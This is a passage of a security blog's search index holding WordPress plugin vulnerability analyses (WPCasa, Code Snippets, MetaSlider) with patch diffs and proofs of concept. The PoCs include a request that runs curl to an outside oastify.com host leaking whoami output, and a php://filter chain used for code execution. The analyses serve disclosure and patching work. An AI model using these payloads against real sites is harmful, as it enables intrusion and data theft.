POC","uri":"/posts/2025-11-30-cve-2025-32222/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Never use eval() on user-supplied data, even if the user has lower privileges than an admin. Logical expressions should be processed using a dedicated parser + function whitelist, not by direct execution. Data attached to blocks (block attributes) is still user input and must be strictly controlled. Even the Contributor role can lead to critical RCE if input handling is flawed. Replacing eval() with a safe parsing approach is the correct direction for plugins that process “user logic”. ","date":"2025-11-30","objectID":"/posts/2025-11-30-cve-2025-32222/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/posts/2025-11-30-cve-2025-32222/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Remote Code Execution (RCE) WordPress Widget Logic Plugin \u003c= 6.0.5 is vulnerable to PHP Object Injection ","date":"2025-11-30","objectID":"/posts/2025-11-30-cve-2025-32222/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/posts/2025-11-30-cve-2025-32222/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WPCasa Plugin.","date":"2025-11-28","objectID":"/posts/2025-11-28-cve-2025-9321/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/posts/2025-11-28-cve-2025-9321/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The WPCasa WordPress plugin is vulnerable to Code Injection in all versions up to and including 1.4.1. The root cause is insufficient validation and restriction of input within the 'api_requests' function. This allows an unauthenticated attacker to invoke arbitrary functions and execute code. CVE ID: CVE-2025-9321 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 1.4.1 Patched Versions: 1.4.2 CVSS severity: High (10) Required Privilege: Contributor Product: WordPress WPCasa Plugin ","date":"2025-11-28","objectID":"/posts/2025-11-28-cve-2025-9321/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/posts/2025-11-28-cve-2025-9321/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - WPCasa: 1.4.1 – vulnerable 1.4.2 – patched Diff Tool → Meld or any diff tool. ","date":"2025-11-28","objectID":"/posts/2025-11-28-cve-2025-9321/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/posts/2025-11-28-cve-2025-9321/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v1.4.1): class-wpsight-api.php v1.4.1 public function api_requests() { global $wp; if ( ! empty( $_GET['wpsight-api'] ) ) $wp-\u003equery_vars['wc-api'] = sanitize_text_field( $_GET['wpsight-api'] ); if ( ! empty( $wp-\u003equery_vars['wc-api'] ) ) { // Buffer, we won't want any output here ob_start(); // Get API trigger $api = strtolower( esc_attr( $wp-\u003equery_vars['wpsight-api'] ) ); // Load class if exists if ( class_exists( $api ) ) $api_class = new $api(); // Trigger actions do_action( 'wpsight_api_' . $api ); // Done, clear buffer and exit ob_end_clean(); die('1'); } } This function reads the wpsight-api parameter from the URL, uses it to instantiate a class if it exists, triggers the associated do_action hook, and finally terminates with die('1'). The issue is that the URL-supplied data is not tightly controlled, making it easy to exploit for code execution. Patched version (v1.4.2): class-wpsight-api.php v1.4.2 public function api_requests() { global $wp; // 1) Preferred getter. $raw = get_query_var( 'wpsight-api' ); // 2) Fallback: directly from $wp-\u003equery_vars. if ( empty( $raw ) \u0026\u0026 isset( $wp-\u003equery_vars['wpsight-api'] ) ) { $raw = $wp-\u003equery_vars['wpsight-api']; } // 3) Last resort: direct $_GET. if ( empty( $raw ) \u0026\u0026 ! empty( $_GET['wpsight-api'] ) ) { $raw = sanitize_text_field( wp_unslash( $_GET['wpsight-api'] ) ); } // No request found → exit early. if ( empty( $raw ) ) { return; } // Sanitize to a valid key. $api = sanitize_key( $raw ); if ( empty( $api ) ) { return; } /** * Build allow-list of allowed API endpoints. */ $allowed = apply_filters( 'wpsight_api_allowed_endpoints', array() ); // If API is not allowed, block access. if ( ! isset( $allowed[ $api ] ) ) { wp_die( sprintf( esc_html__( 'Endpoint \"%s\" not allowed.', 'wpcasa' ), $api ), esc_html__( 'Forbidden', 'wpcasa' ), array( 'response' =\u003e 403 ) ); } // Start output buffering. ob_start(); // Optional: safe class instantiation if explicitly allowed. if ( ! empty( $allowed[ $api ]['class'] ) \u0026\u0026 class_exists( $allowed[ $api ]['class'] ) ) { new $allowed[ $api ]['class'](); } /** * Trigger API action hook. */ do_action( 'wpsight_api_' . $api ); if ( defined( 'WP_DEBUG' ) \u0026\u0026 WP_DEBUG ) { ob_end_flush(); } else { ob_end_clean(); } die( '1' ); } Patch changes The patch: Reads input with layered fallbacks: get_query_var → $wp-\u003equery_vars → $_GET. Uses sanitize_key for strict input control. Enforces an allow‑list using wpsight_api_allowed_endpoints. Blocks all endpoints not explicitly allowed (403). Only instantiates classes if clearly defined in the allow-list. Improves safety and prevents unauthorized code execution. ","date":"2025-11-28","objectID":"/posts/2025-11-28-cve-2025-9321/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/posts/2025-11-28-cve-2025-9321/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers this action hook: class-wpsight-api.php v1.4.1 add_action( 'parse_request', array( $this, 'api_requests'), 0 ); parse_request: This hook fires very early, right after WordPress parses the URL and populates $wp. It is responsible for processing query variables, meaning the api_requests callback executes immediately when processing the request. ","date":"2025-11-28","objectID":"/posts/2025-11-28-cve-2025-9321/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/posts/2025-11-28-cve-2025-9321/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Attacker sends request /?wpsight-api=payload\"] --\u003e B[\"parse_request hook triggers api_requests()\"] B --\u003e C[\"Read user input $_GET['wpsight-api']\"] C --\u003e D[\"$api = strtolower(esc_attr(...))\"] D --\u003e E{\"class_exists($api)?\"} E -- Yes --\u003e F[\"Instantiate arbitrary class new $api() → constructor executes\"] E -- No --\u003e G[\"Skip class creation\"] F --\u003e H[\"Trigger dynamic hook do_action('wpsight_api_' . $api)\"] G --\u003e H H --\u003e I{\"Hook handler exists?\"} I -- Yes --\u003e J[\"Callback executed → attacker-controlled code\"] I -- No --\u003e K[\"No action, but die('1') still called\"] J --\u003e L[\"RCE achieved\"] K --\u003e L L --\u003e Z[\"End\"] graph TD A[\"Attacker sends request /?wpsight-api=payload\"] --\u003e B[\"parse_request hook triggers api_requests()\"] B --\u003e C[\"Read user input $_GET['wpsight-api']\"] C --\u003e D[\"$api = strtolower(esc_attr(...))\"] D --\u003e E{\"class_exists($api)?\"} E -- Yes --\u003e F[\"Instantiate arbitrary class new $api() → constructor executes\"] E -- No --\u003e G[\"Skip class creation\"] F --\u003e H[\"Trigger dynamic hook do_action('wpsight_api_' . $api)\"] G --\u003e H H --\u003e I{\"Hook handler exists?\"} I -- Yes --\u003e J[\"Callback executed → attacker-controlled code\"] I -- No --\u003e K[\"No action, but die('1') still called\"] J --\u003e L[\"RCE achieved\"] K --\u003e L L --\u003e Z[\"End\"] graph TD A[\"Attacker sends request /?wpsight-api=payload\"] --\u003e B[\"parse_request hook triggers api_requests()\"] B --\u003e C[\"Read user input $_GET['wpsight-api']\"] C --\u003e D[\"$api = strtolower(esc_attr(...))\"] D --\u003e E{\"class_exists($api)?\"} E -- Yes --\u003e F[\"Instantiate arbitrary class new $api() → constructor executes\"] E -- No --\u003e G[\"Skip class creation\"] F --\u003e H[\"Trigger dynamic hook do_action('wpsight_api_' . $api)\"] G --\u003e H H --\u003e I{\"Hook handler exists?\"} I -- Yes --\u003e J[\"Callback executed → attacker-controlled code\"] I -- No --\u003e K[\"No action, but die('1') still called\"] J --\u003e L[\"RCE achieved\"] K --\u003e L L --\u003e Z[\"End\"] graph TD A[\"Attacker sends request /?wpsight-api=payload\"] --\u003e B[\"parse_request hook triggers api_requests()\"] B --\u003e C[\"Read user input $_GET['wpsight-api']\"] C --\u003e D[\"$api = strtolower(esc_attr(...))\"] D --\u003e E{\"class_exists($api)?\"} E -- Yes --\u003e F[\"Instantiate arbitrary class new $api() → constructor executes\"] E -- No --\u003e G[\"Skip class creation\"] F --\u003e H[\"Trigger dynamic hook do_action('wpsight_api_' . $api)\"] G --\u003e H H --\u003e I{\"Hook handler exists?\"} I -- Yes --\u003e J[\"Callback executed → attacker-controlled code\"] I -- No --\u003e K[\"No action, but die('1') still called\"] J --\u003e L[\"RCE achieved\"] K --\u003e L L --\u003e Z[\"End\"] ","date":"2025-11-28","objectID":"/posts/2025-11-28-cve-2025-9321/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/posts/2025-11-28-cve-2025-9321/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create an evil class in wp-config.php for testing: class evil { public $command = \"ls /\"; public function __construct() { $this-\u003ecommand = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : $this-\u003ecommand; die(system($this-\u003ecommand)); } } Send a request with payload: GET /?wpsight-api=evil\u0026cmd=curl+http://n9xe0s2jxjyt8klg2lxcj4b6jxpode13.oastify.com/?leaked=$(whoami) HTTP/1.1 Host: localhost Output ","date":"2025-11-28","objectID":"/posts/2025-11-28-cve-2025-9321/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/posts/2025-11-28-cve-2025-9321/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability results from unsafe handling of the wpsight-api parameter, allowing arbitrary class instantiation and hook execution, leading to RCE. The patch adds strict input validation and endpoint restrictions to prevent exploitation. ","date":"2025-11-28","objectID":"/posts/2025-11-28-cve-2025-9321/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/posts/2025-11-28-cve-2025-9321/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways URL‑supplied data must be restricted using allow‑lists. Dynamic hooks and class instantiation must not rely on user input. Insufficient input validation can lead to critical RCE vulnerabilities. ","date":"2025-11-28","objectID":"/posts/2025-11-28-cve-2025-9321/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/posts/2025-11-28-cve-2025-9321/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Remote Code Execution (RCE) WordPress WPCasa Plugin \u003c= 1.4.1 is vulnerable to PHP Object Injection ","date":"2025-11-28","objectID":"/posts/2025-11-28-cve-2025-9321/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/posts/2025-11-28-cve-2025-9321/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Code Snippets Plugin.","date":"2025-11-27","objectID":"/posts/2025-11-27-cve-2025-13035/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/posts/2025-11-27-cve-2025-13035/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The WordPress Code Snippets plugin contains a PHP Code Injection vulnerability in all versions up to and including 3.9.1. The root cause is that the plugin uses extract() on attacker-controlled shortcode attributes inside the evaluate_shortcode_from_flat_file method, which can be used to overwrite the $filepath variable and then pass it into require_once. This allows an authenticated attacker with Contributor privileges or higher to execute arbitrary PHP code on the server via the [code_snippet] shortcode by leveraging PHP filter chains if they can trick an administrator into enabling the “Enable file-based execution” option and creating at least one active Content snippet. CVE ID: CVE-2025-13035 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 3.9.1 Patched Versions: 3.9.2 CVSS severity: Medium (8.5) Required Privilege: Contributor Product: WordPress Code Snippets Plugin ","date":"2025-11-27","objectID":"/posts/2025-11-27-cve-2025-13035/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/posts/2025-11-27-cve-2025-13035/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Code Snippets: 3.9.1 – vulnerable 3.9.2 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-27","objectID":"/posts/2025-11-27-cve-2025-13035/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/posts/2025-11-27-cve-2025-13035/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v3.9.1): class-front-end.php v3.9.1 private function evaluate_shortcode_from_flat_file( $filepath, array $atts ): string { ob_start(); ( function( $atts ) use ( $filepath ) { /** * Avoiding extract is typically recommended, however in this situation we want to make it easy for snippet * authors to use custom attributes. * * @phpcs:disable WordPress.PHP.DontExtract.extract_extract */ extract( $atts ); require_once $filepath; } )( $atts ); return ob_get_clean(); } In evaluate_shortcode_from_flat_file, an anonymous function is defined and immediately invoked (IIFE). It receives $atts (the shortcode attributes array) and uses $filepath from the outer scope via use ($filepath). The extract($atts) statement converts each element in the $atts array into a separate variable in the current scope’s symbol table. Example: $atts = ['color' =\u003e 'blue', 'size' =\u003e 'large']; extract($atts); // Now we have $color = 'blue', $size = 'large' Internally, PHP manages variables through zval containers: Quote A PHP variable is stored in a container called a “zval”. A zval container contains, besides the variable’s type and value, two additional bits of information. The first is called “is_ref” and is a boolean value indicating whether or not the variable is part of a “reference set”. With this bit, PHP’s engine knows how to differentiate between normal variables and references. Since PHP allows user-land references, as created by the \u0026 operator, a zval container also has an internal reference counting mechanism to optimize memory usage. This second piece of additional information, called “refcount”, contains how many variable names (also called symbols) point to this one zval container. All symbols are stored in a symbol table, of which there is one per scope. There is a scope for the main script (i.e., the one requested through the browser), as well as one for every function or method. When extract() runs: Each element in $atts is mapped to a new variable. These variables point to the same zval as the value in the array. This increases the refcount (number of variable names referencing the same value). When the scope ends, the symbol table is destroyed, refcount decreases, and memory is freed. Bug Variable name collision: If $atts contains a key that matches an existing variable in the scope (e.g., \"filepath\"), that variable will be overwritten. $atts = ['filepath' =\u003e '/tmp/malicious.php']; extract($atts); require_once $filepath; // now loads the file from $atts, not the original This is the root cause of the vulnerability: an attacker can inject \"filepath\" to control which file is require_once. Patch (v3.9.2): Patch changes In the patch, the extract() call was added with the EXTR_SKIP option. This ensures that if $atts has a key matching an existing variable, the original variable is not overwritten. Thus, $filepath from the outer scope remains safe, eliminating the risk of being replaced by $atts data. ","date":"2025-11-27","objectID":"/posts/2025-11-27-cve-2025-13035/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/posts/2025-11-27-cve-2025-13035/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers a shortcode: class-front-end.php v3.9.1 public const CONTENT_SHORTCODE = 'code_snippet'; add_shortcode( self::CONTENT_SHORTCODE, [ $this, 'render_content_shortcode' ] ); When this shortcode appears in post/page content, WordPress calls the render_content_shortcode callback: class-front-end.php v3.9.1 public function render_content_shortcode( array $atts ): string { $atts = $this-\u003econvert_boolean_attribute_flags( $atts, [ 'network', 'php', 'format', 'shortcodes', 'debug' ] ); $original_atts = $atts; $atts = shortcode_atts( [ 'id' =\u003e 0, 'snippet_id' =\u003e 0, 'network' =\u003e false, 'php' =\u003e false, 'format' =\u003e false, 'shortcodes' =\u003e false, 'debug' =\u003e false, ], $atts, self::CONTENT_SHORTCODE ); $id = 0 !== intval( $atts['snippet_id'] ) ? intval( $atts['snippet_id'] ) : intval( $atts['id'] ); if ( ! $id ) { return $this-\u003einvalid_id_warning( $id ); } $snippet = $this-\u003eget_snippet( $id, (bool) $atts['network'], 'html' ); // Render the source code if this is not a shortcode snippet. if ( 'content' !== $snippet-\u003escope ) { return $snippet-\u003eid ? $this-\u003erender_snippet_source( $snippet ) : $this-\u003einvalid_id_warning( $snippet-\u003eid ); } ... $content = $this-\u003eevaluate_shortcode_content( $snippet, $original_atts ); ... } The function creates a Snippet object by calling get_snippet, which accepts three parameters: the snippet ID, a boolean indicating whether network mode is used, and the desired format (html). The result is a Snippet object containing all necessary data for further processing. Next, it checks the snippet’s scope. If the snippet is not of type content (html) Content when creating Snippet the plugin does not process the content and instead returns the snippet’s source code. The evaluate_shortcode_content() function is called to process the shortcode content: class-front-end.php v3.9.1 protected function evaluate_shortcode_content( Snippet $snippet, array $atts ): string { if ( empty( $atts['php'] ) ) { return $snippet-\u003ecode; } if ( ! Snippet_Files::is_active() ) { return $this-\u003eevaluate_shortcode_from_db( $snippet, $atts ); } $network = DB::validate_network_param( $snippet-\u003enetwork ); $table_name = Snippet_Files::get_hashed_table_name( code_snippets()-\u003edb-\u003eget_table_name( $network ) ); $filepath = $this-\u003ebuild_snippet_flat_file_path( $table_name, $snippet ); return file_exists( $filepath ) ? $this-\u003eevaluate_shortcode_from_flat_file( $filepath, $atts ) : $this-\u003eevaluate_shortcode_from_db( $snippet, $atts ); } It checks whether the php attribute exists. If not, it returns the snippet’s original code without execution. If php exists but the storage file does not, it falls back to evaluating directly from the database. The storage file is declared: class-snippet-files.php v3.9.1 private const ENABLED_FLAG_FILE = 'flat-files-enabled.flag'; To prevent the function from returning early, the administrator must enable the “Enable file-based execution” option in the admin panel: Enable file-based execution This creates the storage file inside wp-content/code-snippets: flat-files-enabled.flag created Once the file exists, the function determines the snippet’s network information, retrieves the hashed table name, and builds the path to the snippet content file assigned to $filepath. If $filepath exists, the function calls evaluate_shortcode_from_flat_file( $filepath, $atts ) where the vulnerability occurs. Info The vulnerability is published with Contributor privileges because this is the minimum level required to insert a shortcode into a post. ","date":"2025-11-27","objectID":"/posts/2025-11-27-cve-2025-13035/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/posts/2025-11-27-cve-2025-13035/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Contributor inserts [code_snippet] shortcode\"] --\u003e B[\"WordPress calls render_content_shortcode()\"] B --\u003e C[\"convert_boolean_attribute_flags()\"] C --\u003e D[\"shortcode_atts(): merge defaults into $atts\"] D --\u003e E[\"Determine snippet_id → if invalid → invalid_id_warning()\"] E --\u003e F[\"get_snippet(id, network, 'html') → create Snippet object\"] F --\u003e G{\"snippet.scope == 'content'?\"} G -- No --\u003e H[\"render_snippet_source()\"] H --\u003e Z[\"End\"] G -- Yes --\u003e I[\"evaluate_shortcode_content(snippet, original_atts)\"] I --\u003e J{\"original_atts['php'] enabled?\"} J -- No --\u003e K[\"Return snippet-\u003ecode\"] --\u003e Z J -- Yes --\u003e L{\"Snippet_Files::is_active()?\"} L -- No --\u003e M[\"evaluate_shortcode_from_db()\"] --\u003e Z L -- Yes --\u003e N[\"Build file path: build_snippet_flat_file_path()\"] N --\u003e O{\"Does file exist?\"} O -- No --\u003e M O -- Yes --\u003e P[\"evaluate_shortcode_from_flat_file(filepath, atts)\"] P --\u003e Q[\"extract(atts) inside IIFE\"] Q --\u003e R{\"Do atts contain variable-name collisions (e.g., 'filepath')?\"} R -- No --\u003e S[\"require_once filepath (safe)\"] --\u003e Z R -- Yes --\u003e T[\"Internal variable overwritten → filepath replaced\"] T --\u003e U[\"require_once attacker-controlled file\"] U --\u003e V[\"RCE achieved\"] V --\u003e Z graph TD A[\"Contributor inserts [code_snippet] shortcode\"] --\u003e B[\"WordPress calls render_content_shortcode()\"] B --\u003e C[\"convert_boolean_attribute_flags()\"] C --\u003e D[\"shortcode_atts(): merge defaults into $atts\"] D --\u003e E[\"Determine snippet_id → if invalid → invalid_id_warning()\"] E --\u003e F[\"get_snippet(id, network, 'html') → create Snippet object\"] F --\u003e G{\"snippet.scope == 'content'?\"} G -- No --\u003e H[\"render_snippet_source()\"] H --\u003e Z[\"End\"] G -- Yes --\u003e I[\"evaluate_shortcode_content(snippet, original_atts)\"] I --\u003e J{\"original_atts['php'] enabled?\"} J -- No --\u003e K[\"Return snippet-\u003ecode\"] --\u003e Z J -- Yes --\u003e L{\"Snippet_Files::is_active()?\"} L -- No --\u003e M[\"evaluate_shortcode_from_db()\"] --\u003e Z L -- Yes --\u003e N[\"Build file path: build_snippet_flat_file_path()\"] N --\u003e O{\"Does file exist?\"} O -- No --\u003e M O -- Yes --\u003e P[\"evaluate_shortcode_from_flat_file(filepath, atts)\"] P --\u003e Q[\"extract(atts) inside IIFE\"] Q --\u003e R{\"Do atts contain variable-name collisions (e.g., 'filepath')?\"} R -- No --\u003e S[\"require_once filepath (safe)\"] --\u003e Z R -- Yes --\u003e T[\"Internal variable overwritten → filepath replaced\"] T --\u003e U[\"require_once attacker-controlled file\"] U --\u003e V[\"RCE achieved\"] V --\u003e Z graph TD A[\"Contributor inserts [code_snippet] shortcode\"] --\u003e B[\"WordPress calls render_content_shortcode()\"] B --\u003e C[\"convert_boolean_attribute_flags()\"] C --\u003e D[\"shortcode_atts(): merge defaults into $atts\"] D --\u003e E[\"Determine snippet_id → if invalid → invalid_id_warning()\"] E --\u003e F[\"get_snippet(id, network, 'html') → create Snippet object\"] F --\u003e G{\"snippet.scope == 'content'?\"} G -- No --\u003e H[\"render_snippet_source()\"] H --\u003e Z[\"End\"] G -- Yes --\u003e I[\"evaluate_shortcode_content(snippet, original_atts)\"] I --\u003e J{\"original_atts['php'] enabled?\"} J -- No --\u003e K[\"Return snippet-\u003ecode\"] --\u003e Z J -- Yes --\u003e L{\"Snippet_Files::is_active()?\"} L -- No --\u003e M[\"evaluate_shortcode_from_db()\"] --\u003e Z L -- Yes --\u003e N[\"Build file path: build_snippet_flat_file_path()\"] N --\u003e O{\"Does file exist?\"} O -- No --\u003e M O -- Yes --\u003e P[\"evaluate_shortcode_from_flat_file(filepath, atts)\"] P --\u003e Q[\"extract(atts) inside IIFE\"] Q --\u003e R{\"Do atts contain variable-name collisions (e.g., 'filepath')?\"} R -- No --\u003e S[\"require_once filepath (safe)\"] --\u003e Z R -- Yes --\u003e T[\"Internal variable overwritten → filepath replaced\"] T --\u003e U[\"require_once attacker-controlled file\"] U --\u003e V[\"RCE achieved\"] V --\u003e Z graph TD A[\"Contributor inserts [code_snippet] shortcode\"] --\u003e B[\"WordPress calls render_content_shortcode()\"] B --\u003e C[\"convert_boolean_attribute_flags()\"] C --\u003e D[\"shortcode_atts(): merge defaults into $atts\"] D --\u003e E[\"Determine snippet_id → if invalid → invalid_id_warning()\"] E --\u003e F[\"get_snippet(id, network, 'html') → create Snippet object\"] F --\u003e G{\"snippet.scope == 'content'?\"} G -- No --\u003e H[\"render_snippet_source()\"] H --\u003e Z[\"End\"] G -- Yes --\u003e ","date":"2025-11-27","objectID":"/posts/2025-11-27-cve-2025-13035/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/posts/2025-11-27-cve-2025-13035/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Administrator enables the “Enable file-based execution” option. Contributor inserts the following shortcode into a post with snippet_id pointing to a Snippet of type HTML (content): [code_snippet snippet_id=4 php=1 filepath=/path/to/file] Here the attacker has full control over the filepath variable. This allows using PHP stream wrappers (e.g., filter chains) to achieve code execution because: require_once only checks whether the input is a valid PHP path; it attempts to load any provided stream, not limited to physical files. PHP filter chains can transform the stream content so PHP interprets the final output as valid PHP code. Once the filtered content is passed to require_once, PHP executes it. Many wrappers such as http:// or ftp:// are restricted by default allow_url_include settings, but internal wrappers like php://filter are unaffected by this limitation. Info A filter chain in PHP allows chaining multiple stream filters to process data when reading or writing from a file/stream. It works using the special wrapper: php://filter. This technique is used in CTF competitions, based on the following principles: php://filter: allows attaching filters to a stream (here php://temp). Filter chain: filters are concatenated with |. Data passes through each filter from left to right. Main filters in the chain: convert.iconv.\u003cfrom\u003e.\u003cto\u003e: converts encoding from one charset to another. convert.base64-encode / convert.base64-decode: encode or decode base64. By combining dozens of filters, data is transformed multiple times: encode → re-encode → decode → encode → … until the end. Reference: https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it Run the script to generate a PHP Filter Chain: $ python3 php_filter_chain_generator.py --chain '\u003c?php phpinfo(); ?\u003e ' [+] The following gadget chain will generate the following code : \u003c?php phpinfo(); ?\u003e (base64 value: PD9waHAgcGhwaW5mbygpOyA/PiAg) php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|c","date":"2025-11-27","objectID":"/posts/2025-11-27-cve-2025-13035/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/posts/2025-11-27-cve-2025-13035/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability in the Code Snippets plugin originates from using extract() without protection, allowing internal variables to be overwritten and arbitrary file execution via require_once. When combined with the “Enable file-based execution” option and the [code_snippet] shortcode, a Contributor-level user can trigger unintended PHP code execution. The patch mitigates this by using EXTR_SKIP, ensuring sensitive variables are not overwritten during shortcode processing. ","date":"2025-11-27","objectID":"/posts/2025-11-27-cve-2025-13035/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/posts/2025-11-27-cve-2025-13035/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Using extract() without controlling variable names is highly risky, especially when input comes from users. PHP stream wrappers, including filter chains, can be powerful tools for converting data into executable code. A seemingly harmless option like “Enable file-based execution” can significantly expand the attack surface. WordPress shortcodes must be carefully handled since Contributors can use them in post content. Adding EXTR_SKIP in the patch is a simple but effective measure to prevent overwriting sensitive variables. ","date":"2025-11-27","objectID":"/posts/2025-11-27-cve-2025-13035/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/posts/2025-11-27-cve-2025-13035/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Deserialization WordPress Code Snippets Plugin \u003c= 3.9.1 is vulnerable to PHP Object Injection ","date":"2025-11-27","objectID":"/posts/2025-11-27-cve-2025-13035/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/posts/2025-11-27-cve-2025-13035/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Responsive Slider by MetaSlider Plugin.","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info Deserialization of Untrusted Data vulnerability in MetaSlider Responsive Slider by MetaSlider allows Object Injection. This issue affects Responsive Slider by MetaSlider: from n/a through 3.94.0. CVE ID: CVE-2025-26763 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 3.94.0 Patched Versions: 3.95.0 CVSS severity: Medium (9.8) Required Privilege: Editor Product: WordPress Responsive Slider by MetaSlider Plugin ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:1:0","tags":["analyst","plugin","php object 